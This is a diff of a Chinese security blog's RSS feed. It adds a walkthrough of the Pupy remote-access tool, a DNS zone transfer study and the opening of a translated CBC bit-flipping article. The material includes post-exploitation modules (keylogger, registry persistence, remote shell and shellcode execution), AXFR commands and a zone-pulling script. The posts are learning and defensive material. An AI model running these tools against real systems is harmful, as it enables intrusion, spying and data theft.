+&lt;p&gt;-i是设置过滤器（也可用于其他命令），-g重置过滤器，-l列出所有存活会话，-k杀死选择会话&lt;/p&gt;
+
+&lt;p&gt;会话则会列举出”id”, “user”, “hostname”, “platform”, “release”, “os_arch”, “address”这些值&lt;/p&gt;
+
+&lt;h2 id=&quot;exit&quot;&gt;exit&lt;/h2&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;python&quot;&gt;def do_exit(self, arg):
+        &amp;quot;&amp;quot;&amp;quot; Quit Pupy Shell &amp;quot;&amp;quot;&amp;quot;
+        sys.exit()&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;直接退出，没什么好说的&lt;/p&gt;
+
+&lt;h2 id=&quot;jobs&quot;&gt;jobs&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20151008/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;-h帮助，-l列举出所有任务，-k后接job_id杀死该job，-p后接job_id打印出该job输出&lt;/p&gt;
+
+&lt;h2 id=&quot;python&quot;&gt;python&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20151008/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;运行本地的Python环境，用于调试&lt;/p&gt;
+
+&lt;h2 id=&quot;read&quot;&gt;read&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20151008/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;python&quot;&gt;def do_read(self, arg):
+    &amp;quot;&amp;quot;&amp;quot; execute a list of commands from a file &amp;quot;&amp;quot;&amp;quot;
+    try:
+        if not arg:
+            self.display_error(&amp;quot;usage: read &amp;lt;filename&amp;gt;&amp;quot;)
+            return
+        with open(arg,'r') as f:
+            self.cmdqueue.extend(f.read().splitlines())
+    except Exception as e:
+        self.display_error(str(e))&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;接受一个文件，并逐行执行命令&lt;/p&gt;
+
+&lt;h1 id=&quot;x03-run&quot;&gt;0x03 run&lt;/h1&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;首先来介绍一下list_moudules和run命令（和msf很类似）&lt;/p&gt;
+
+&lt;h2 id=&quot;listmodules&quot;&gt;list_modules&lt;/h2&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;python&quot;&gt;PupyCmd.py:
+def do_list_modules(self, arg):
+    &amp;quot;&amp;quot;&amp;quot; List available modules with a brief description &amp;quot;&amp;quot;&amp;quot;
+    for m,d in self.pupsrv.list_modules():
+        self.stdout.write(&amp;quot;{:&amp;lt;20}   {}\n&amp;quot;.format(m, color(d,'grey')))
+
+PupyServer.py:
+def list_modules(self):
+    l=[]
+    for loader, module_name, is_pkg in pkgutil.iter_modules(modules.__path__):
+        module=self.get_module(module_name)
+        l.append((module_name,module.__doc__))
+    return l&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;将modules包中脚本所包含的modules都列举出来，并附加简要说明&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20151008/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;各模块支持的平台如下&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;migrate (windows only)
+    &lt;ul&gt;
+      &lt;li&gt;inter process architecture injection also works (x86-&amp;gt;x64 and x64-&amp;gt;x86)&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;keylogger (windows only)&lt;/li&gt;
+  &lt;li&gt;persistence (windows only)&lt;/li&gt;
+  &lt;li&gt;screenshot (windows only)&lt;/li&gt;
+  &lt;li&gt;webcam snapshot (windows only)&lt;/li&gt;
+  &lt;li&gt;command execution&lt;/li&gt;
+  &lt;li&gt;download&lt;/li&gt;
+  &lt;li&gt;upload&lt;/li&gt;
+  &lt;li&gt;socks5 proxy&lt;/li&gt;
+  &lt;li&gt;local port forwarding&lt;/li&gt;
+  &lt;li&gt;interactive shell (cmd.exe, /bin/sh, …)&lt;/li&gt;
+  &lt;li&gt;interactive python shell&lt;/li&gt;
+  &lt;li&gt;shellcode exec (thanks to @byt3bl33d3r)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;run&quot;&gt;run&lt;/h2&gt;
+
+&lt;p&gt;run命令则是直接运行这些模块&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20151008/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;-h帮助，-f设置客户端过滤条件，–bg后台运行，后接模块及其参数&lt;/p&gt;
+
+&lt;p&gt;对于过滤条件的设置，可以直接指定clients输出id值，或者是其他冒号分割的名值对&lt;/p&gt;
+
+&lt;p&gt;在pupy.conf文件中，主命令info，ps，migrate，exec，pyexe，kill分别具有run modules功能中的别名get_info，ps，migrate，shell_exec，pyexe，process_kill&lt;/p&gt;
+
+&lt;p&gt;下面介绍一下相关模块的功能&lt;/p&gt;
+
+&lt;h3 id=&quot;interactiveshell&quot;&gt;interactive_shell&lt;/h3&gt;
+
+&lt;p&gt;交互shell所有平台均支持，这里我把显示Windows的编码换成了cp936，可以良好显示中文啦&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20151008/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;shellexec&quot;&gt;shell_exec&lt;/h3&gt;
+
+&lt;p&gt;直接执行远程shell命令，Windows上的编码还是换成cp936&lt;/p&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;python&quot;&gt;shell_exec.py:
+...
+if self.client.is_windows():
+    try:
+        res=res.decode('cp936')#437')&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20151008/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;pyshell&quot;&gt;pyshell&lt;/h3&gt;
+
+&lt;p&gt;开启远程Python交互shell&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20151008/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;pyexec&quot;&gt;pyexec&lt;/h3&gt;
+
+&lt;p&gt;直接在远程系统上执行Python代码，–file接文件或-c接代码&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20151008/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;download&quot;&gt;download&lt;/h3&gt;
+
+&lt;p&gt;通过使用&lt;code&gt;from rpyc.utils.classic import download&lt;/code&gt;，实现从远程系统上下载文件&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20151008/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;python&quot;&gt;remote_file=self.client.conn.modules['os.path'].expandvars(args.remote_file)
+rep=os.path.join(&amp;quot;data&amp;quot;,&amp;quot;downloads&amp;quot;,self.client.short_name())
+if not args.local_file:
+    try:
+        os.makedirs(rep)&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;如果未指明本地路径，则存储在/data/downloads中&lt;/p&gt;
+
+&lt;h3 id=&quot;upload&quot;&gt;upload&lt;/h3&gt;
+
+&lt;p&gt;通过使用&lt;code&gt;from rpyc.utils.classic import upload&lt;/code&gt;实现上传，功能与download相仿&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20151008/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;search&quot;&gt;search&lt;/h3&gt;
+
+&lt;p&gt;在指定path中搜索string&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20151008/search.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;getinfo&quot;&gt;get_info&lt;/h3&gt;
+
+&lt;p&gt;获取受控端平台信息&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20151008/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;exit-1&quot;&gt;exit&lt;/h3&gt;
+
+&lt;p&gt;退出受控端并确认&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20151008/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;ps&quot;&gt;ps&lt;/h3&gt;
+
+&lt;p&gt;列出进程，默认给出’username’, ‘pid’, ‘arch’, ‘exe’的信息，-a则给出’username’, ‘pid’, ‘arch’, ‘name’, ‘exe’, ‘cmdline’, ‘status’&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20151008/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20151008/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;getprivs&quot;&gt;getprivs&lt;/h3&gt;
+
+&lt;p&gt;获取SeDebug权限&lt;/p&gt;
+
+&lt;h3 id=&quot;processkill&quot;&gt;process_kill&lt;/h3&gt;
+
+&lt;p&gt;杀死pid进程&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20151008/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;socks5proxy&quot;&gt;socks5proxy&lt;/h3&gt;
+
+&lt;p&gt;开启socks5代理，-p指定端口&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20151008/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;portfwd&quot;&gt;portfwd&lt;/h3&gt;
+
+&lt;p&gt;本地或远程端口转发，远程端口转发还未开发，本地端口转发则是&lt;code&gt;-L [&amp;lt;LOCAL_ADDR&amp;gt;]:&amp;lt;LOCAL_PORT&amp;gt;:&amp;lt;REMOTE_ADDR&amp;gt;:&amp;lt;REMOTE_PORT&amp;gt;&lt;/code&gt;，-k则kill掉对应的id转发（id依次增一）&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20151008/portfwd.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;shellexec-1&quot;&gt;shell_exec&lt;/h3&gt;
+
+&lt;p&gt;直接执行shellcode&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20151008/shellcode_exec.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;keylogger&quot;&gt;keylogger&lt;/h3&gt;
+
+&lt;p&gt;键盘记录&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20151008/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;screenshot&quot;&gt;screenshot&lt;/h3&gt;
+
+&lt;p&gt;截屏，-e遍历屏幕，-s SCREEN指定特定的屏幕（穷吊没验证），-v截屏后直接预览&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20151008/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;webcamsnap&quot;&gt;webcamsnap&lt;/h3&gt;
+
+&lt;p&gt;捕捉网络摄像头，-d DEVICE指定特定的设备（同没验证），-v捕捉后直接预览&lt;/p&gt;
+
+&lt;h3 id=&quot;migrate&quot;&gt;migrate&lt;/h3&gt;
+
+&lt;p&gt;迁移至其他进程（由pid指定）&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20151008/migrate.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;persistence&quot;&gt;persistence&lt;/h3&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;python&quot;&gt;persistence.py:
+... 
+remote_path=self.client.conn.modules['os.path'].expandvars(&amp;quot;%TEMP%\\{}.exe&amp;quot;.format(''.join([random.choice(string.ascii_lowercase) for x in range(0,random.randint(6,12))])))&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;权限维持，写入到注册表中（对应临时目录下的随机命令exe），并开机启动&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20151008/persistence.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;msgbox&quot;&gt;msgbox&lt;/h3&gt;
+
+&lt;p&gt;最后作者示范了一下如何编写这个msgbox模块&lt;/p&gt;
+
+&lt;p&gt;首先新建一个pupy/packages/windows/all/pupwinutils/msgbox.py ，再写一个你想导入受控端的类或函数&lt;/p&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;python&quot;&gt;import ctypes
+import threading    
+
+def MessageBox(text, title):
+    t=threading.Thread(target=ctypes.windll.user32.MessageBoxA, args=(None, text, title, 0))
+    t.daemon=True
+    t.start()&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;然后再创建一个模块来导入我们包和调用我们的函数&lt;/p&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;python&quot;&gt;class MsgBoxPopup(PupyModule):
+    &amp;quot;&amp;quot;&amp;quot; Pop up a custom message box &amp;quot;&amp;quot;&amp;quot;    
+
+    def init_argparse(self):
+        self.arg_parser = PupyArgumentParser(prog=&amp;quot;msgbox&amp;quot;, description=self.__doc__)
+        self.arg_parser.add_argument('--title', help='msgbox title')
+        self.arg_parser.add_argument('text', help='text to print in the msgbox :)')    
+
+    @windows_only
+    def is_compatible(self):
+        pass    
+
+    def run(self, args):
+        self.client.load_package(&amp;quot;pupwinutils.msgbox&amp;quot;)
+        self.client.conn.modules['pupwinutils.msgbox'].MessageBox(args.text, args.title)
+        self.log(&amp;quot;message box popped !&amp;quot;)&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;title指定标题，再接内容&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20151008/msg.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
 </description>
         
-        <pubDate>Thu, 08 Oct 2015 15:00:00 -0400</pubDate>
+        <pubDate>Fri, 09 Oct 2015 03:00:00 +0800</pubDate>
         <link>
         https://larryxi.github.io/pupy-first-touch-101.html</link>
         <guid isPermaLink="true">https://larryxi.github.io/pupy-first-touch-101.html</guid>
@@ -1312,9 +2703,177 @@ patching file ext/simplexml/simplexml.c
         
           <description>&lt;h1 id=&quot;x00-&quot;&gt;0x00 前言&lt;/h1&gt;
 
+&lt;hr /&gt;
+
+&lt;p&gt;本文是关于DNS域传送漏洞的学习与总结。&lt;/p&gt;
+
+&lt;p&gt;在&lt;a href=&quot;http://www.hackcto.com/post/2013-01-15/40047740289&quot;&gt;《安全参考》&lt;/a&gt;第一期中有：区域传送操作指的是一台后备服务器使用来自主服务器的数据刷新自己的 zone 数据库。这为运行中的 DNS 服务提供了一定的冗余度,其目的是为了防止主域名服务器因意外故障变得不可用时影响到全局。一般来说,DNS区域传送操作只在网络里真的有后备域名 DNS 服务器时才有必要执行,但许多 DNS 服务器却被错误地配置成&lt;strong&gt;只要有人发出请求&lt;/strong&gt;,就会向对方提供一个 zone 数据库的&lt;strong&gt;拷贝&lt;/strong&gt;。如果所提供的信息只是与连到因特网上且具备有效主机名的系统相关,那么这种错误配置不一定是坏事,尽管这使得攻击者发现潜在目标要容易得多。真正的问题发生在一个单位没有使用公用/私用 DNS 机制来分割外部公用 DNS 信息和内部私用 DNS 信息的时候,此时内部主机名和 IP 地址都暴露给了攻击者。把内部 IP 地址信息提供给因特网上不受信任的用户,就像是把一个单位的内部网络完整蓝图或导航图奉送给了别人。对系统管理员来说,允许不受信任的因特网用户执行 DNS 区域传送(&lt;code&gt;zone transfer&lt;/code&gt;)操作是后果最为严重的错误配置之一。&lt;/p&gt;
+
+&lt;p&gt;同时，在&lt;a href=&quot;http://wiki.wooyun.org/information:domain&quot;&gt;WooYun WiKi&lt;/a&gt;中也说道，利用DNS域传送漏洞可以有效地收集相关企业的子域名，收集信息也是渗透过程中很关键的一步。&lt;/p&gt;
+
+&lt;h1 id=&quot;x02-&quot;&gt;0x02 攻击方法&lt;/h1&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;windowsnslookup&quot;&gt;Windows下使用nslookup&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;先设置查找类型为NS，查找出对应主机域的域名服务器。（或直接键入nslookup进入交互模式，再通过&lt;code&gt;set type=ns&lt;/code&gt;进行设置）&lt;/p&gt;
+
+    &lt;p&gt;&lt;code&gt;C:\&amp;gt;nslookup -qa=ns test.com&lt;/code&gt;&lt;/p&gt;
+
+    &lt;p&gt;会返回类似结果：&lt;/p&gt;
+
+    &lt;pre&gt;&lt;code&gt;    Server:  bogon
+    Address:  172.16.162.2           
+
+    Non-authoritative answer:
+    test.com        nameserver = ns66.worldnic.com
+    test.com        nameserver = ns65.worldnic.com
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;使用nslookup命令进入交互模式，更改默认服务器为刚才查询的域名服务器&lt;/p&gt;
+
+    &lt;p&gt;&lt;code&gt;&amp;gt; server=ns66.worldnic.com&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;列出服务器上所有的DNS记录&lt;/p&gt;
+
+    &lt;p&gt;&lt;code&gt;&amp;gt; ls -d test.com&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;nslookup命令参考：&lt;/p&gt;
+
+    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;http://roclinux.cn/?p=2441&quot;&gt;《nslookup通往DNS的桥梁》-linux命令五分钟系列之三十三&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;nslookup进入交互模式后查看帮助：&lt;code&gt;&amp;gt;help&lt;/code&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;kalidig-dnsenum-dnswalk&quot;&gt;Kali下使用dig, dnsenum, dnswalk&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;使用&lt;code&gt;dig&lt;/code&gt;命令进行全量传输&lt;a href=&quot;http://www.cnblogs.com/cobbliu/archive/2013/03/24/2979521.html&quot;&gt;AXFR&lt;/a&gt;（从域名服务器从主域名服务器上请求zone文件）&lt;/p&gt;
+
+    &lt;pre&gt;&lt;code&gt;  dig @dnsserver name querytype
+  dig @192.168.5.6 test.com axfr
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;使用&lt;code&gt;dnsenum&lt;/code&gt;获取测试对象全部的 DNS 解析记录信息&lt;/p&gt;
+
+    &lt;pre&gt;&lt;code&gt;  ./dnsenum.pl –enum test.com
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;使用&lt;code&gt;dnswalk&lt;/code&gt;获取测试对象全部的 DNS 解析记录信息，注意域名后有一个点&lt;/p&gt;
+
+    &lt;pre&gt;&lt;code&gt;  ./dnswalk test.com.
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;相关命令参考：&lt;/p&gt;
+
+    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;http://www.hackcto.com/post/2013-01-15/40047740289&quot;&gt;《安全参考》第一期&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;http://drops.wooyun.org/papers/64&quot;&gt;DNS域传送信息泄露&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;http://roclinux.cn/?p=2449&quot;&gt;《dig挖出DNS的秘密》-linux命令五分钟系列之三十四&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;x03-python&quot;&gt;0x03 攻击Python脚本分析&lt;/h1&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;一看Github上有，就拿来分析一下吧，&lt;a href=&quot;https://github.com/kaizoku/zonepull/blob/master/zonepull/zonepull.py&quot;&gt;kaizoku/zonepull&lt;/a&gt;&lt;/p&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;python&quot;&gt;#!/usr/bin/env python
+### Zonepuller
+## Attempts to get a domain transfer from the nameservers for the given domain
+## Requires dnspython http://www.dnspython.org/    import sys
+import socket
+import optparse
+try:
+    from dns import resolver, query, exception
+except ImportError:
+    print &amp;quot;This script requires dnspython&amp;quot;
+    print &amp;quot;http://www.dnspython.org/&amp;quot;
+    sys.exit(1)    
+
+class Transferrer(object):
+    def __init__(self, domain):
+        self.domain = domain
+        ## build list of nameservers
+        nss = resolver.query(domain, 'NS')
+        self.nameservers = [ str(ns) for ns in nss ]    
+    def transfer(self):
+        for ns in self.nameservers:
+            print &amp;gt;&amp;gt; sys.stderr, &amp;quot;Querying %s&amp;quot; % (ns,)
+            print &amp;gt;&amp;gt; sys.stderr, &amp;quot;-&amp;quot; * 50
+            z = self.query(ns)
+            print z
+            print &amp;gt;&amp;gt; sys.stderr, &amp;quot;%s\n&amp;quot; % (&amp;quot;-&amp;quot; * 50,)    
+    def query(self, ns):
+        nsaddr = self.resolve_a(ns)
+        try:
+            z = self.pull_zone(nsaddr)
+        except (exception.FormError, socket.error, EOFError):
+            print &amp;gt;&amp;gt; sys.stderr, &amp;quot;AXFR failed\n&amp;quot;
+            return None
+        else:
+            return z    
+    def resolve_a(self, name):
+        &amp;quot;&amp;quot;&amp;quot;Pulls down an A record for a name&amp;quot;&amp;quot;&amp;quot;
+        nsres = resolver.query(name, 'A')
+        return str(nsres[0])    
+    def pull_zone(self, nameserver):
+        &amp;quot;&amp;quot;&amp;quot;Sends the domain transfer request&amp;quot;&amp;quot;&amp;quot;
+        q = query.xfr(nameserver, self.domain, relativize=False, timeout=2)
+        zone = &amp;quot;&amp;quot;   ## janky, but this library returns
+        for m in q: ## an empty generator on timeout
+            zone += str(m)
+        if not zone:
+            raise EOFError
+        return zone    
+def main():
+    parser = optparse.OptionParser(usage=&amp;quot;%prog &amp;lt;domain&amp;gt;&amp;quot;, version=&amp;quot;%prog 0.1&amp;quot;)
+    options, args = parser.parse_args()
+    if not args:
+        parser.error(&amp;quot;Must include at least one domain to transfer&amp;quot;)        for dom in args:
+        t = Transferrer(dom)
+        t.transfer()&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;section&quot;&gt;分析：&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;程序先尝试导入dns，没有安装dnspython则退出&lt;/li&gt;
+  &lt;li&gt;定义Transferrer()类来完成主要的域传送检测，先使用&lt;code&gt;resolver.query(domain, 'NS')&lt;/code&gt;方法查询对应域名的NS记录，并将其作为域名服务器查询其A记录，最后使用&lt;code&gt;query.xfr(nameserver, self.domain, relativize=False, timeout=2)&lt;/code&gt;尝试进行域传送&lt;/li&gt;
+  &lt;li&gt;main()函数主要对命令行传入的域名进行单线程串行检测是否存在DNS域传送&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;tips&quot;&gt;Tips：&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code&gt;print &amp;gt;&amp;gt; sys.stderr, &quot;Message&quot;&lt;/code&gt;可将信息重定向输出到标准错误输出当中&lt;/li&gt;
+  &lt;li&gt;&lt;code&gt;parser.error(&quot;Message&quot;)&lt;/code&gt;可用于选项解析错误提示&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;x04-&quot;&gt;0x04 防御方法&lt;/h1&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;在相应的zone、options中添加allow-transfer限制，具体见&lt;a href=&quot;http://wiki.wooyun.org/doku.php?id=server:zone-transfer&quot;&gt;DNS 域传送漏洞&lt;/a&gt;。这里还存在的&lt;strong&gt;问题&lt;/strong&gt;是：未对DNS服务和DNS服务器深入了解，攻击也没有重现，还有待深入学习，而且DNS的问题也不止这些，&lt;a href=&quot;http://www.cnblogs.com/cobbliu/archive/2013/03/24/2979521.html&quot;&gt;推荐看看&lt;/a&gt;&lt;/p&gt;
+
 </description>
         
-        <pubDate>Wed, 02 Sep 2015 09:30:00 -0400</pubDate>
+        <pubDate>Wed, 02 Sep 2015 21:30:00 +0800</pubDate>
         <link>
         https://larryxi.github.io/DNS-zone-transfer-studying.html</link>
         <guid isPermaLink="true">https://larryxi.github.io/DNS-zone-transfer-studying.html</guid>
@@ -1327,9 +2886,349 @@ patching file ext/simplexml/simplexml.c
         
           <description>&lt;h1 id=&quot;x00-&quot;&gt;0x00 译者前言&lt;/h1&gt;
 
+&lt;hr /&gt;
+
+&lt;p&gt;本文翻译自：&lt;a href=&quot;http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/&quot;&gt;http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/&lt;/a&gt;&lt;br /&gt;
+drops里的相关主题文章：&lt;a href=&quot;http://drops.wooyun.org/tips/4975&quot;&gt;使用CBC比特反转攻击绕过加密的会话令牌&lt;/a&gt;&lt;br /&gt;
+缘起是糖果出的一道题，看到原文作者对这一问题阐述的较为详细，虽然时间有些久远，但翻译一下可与诸君学习一下思考问题的方法。&lt;/p&gt;
+
+&lt;h1 id=&quot;x01-&quot;&gt;0x01 相关介绍&lt;/h1&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;此攻击方法的精髓在于：&lt;strong&gt;通过损坏密文字节来改变明文字节&lt;/strong&gt;。（注：借助CBC内部的模式）借由此可以绕过过滤器，或者改变用户权限提升至管理员，又或者改变应用程序预期明文以尽猥琐之事。&lt;/p&gt;
+
+&lt;p&gt;首先让我们看看CBC是如何工作的，（作者很懒所以）更多细节你可以看这里：&lt;a href=&quot;http://en.wikipedia.org/wiki/Block_cipher_mode_of_operation&quot;&gt;wiki&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;在这里只是解释一下关于攻击必须要理解的部分。（即：一图胜千言）&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;加密过程&lt;/strong&gt;
+&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20150808/Encryption.png&quot; alt=&quot;Encryption&quot; /&gt;
+&lt;strong&gt;Plaintext&lt;/strong&gt;：待加密的数据。
+&lt;strong&gt;IV&lt;/strong&gt;：用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文。
+&lt;strong&gt;Key&lt;/strong&gt;：被一些如AES的对称加密算法使用。
+&lt;strong&gt;Ciphertext&lt;/strong&gt;：加密后的数据。&lt;/p&gt;
+
+&lt;p&gt;在这里重要的一点是，CBC工作于一个固定长度的比特组，将其称之为&lt;em&gt;块&lt;/em&gt;。在本文中，我们将使用包含16字节的块。&lt;/p&gt;
+
+&lt;p&gt;因为作者讨厌高数（和译者一样），所以作者造了一些自己的公式（方便记忆）：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;em&gt;Ciphertext-0 = Encrypt(Plaintext XOR IV)&lt;/em&gt;—只用于第一个组块&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;Ciphertext-N= Encrypt(Plaintext XOR Ciphertext-N-1)&lt;/em&gt;—用于第二及剩下的组块&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;注意：正如你所见，&lt;strong&gt;前一块的密文用来产生后一块的密文&lt;/strong&gt;。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Decryption Process&lt;/strong&gt;
+&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20150808/Decryption.png&quot; alt=&quot;Decryption&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;em&gt;Plaintext-0 = Decrypt(Ciphertext) XOR IV&lt;/em&gt;—只用于第一个组块&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;Plaintext-N= Decrypt(Ciphertext) XOR Ciphertext-N-1&lt;/em&gt;—用于第二及剩下的组块&lt;/li&gt;
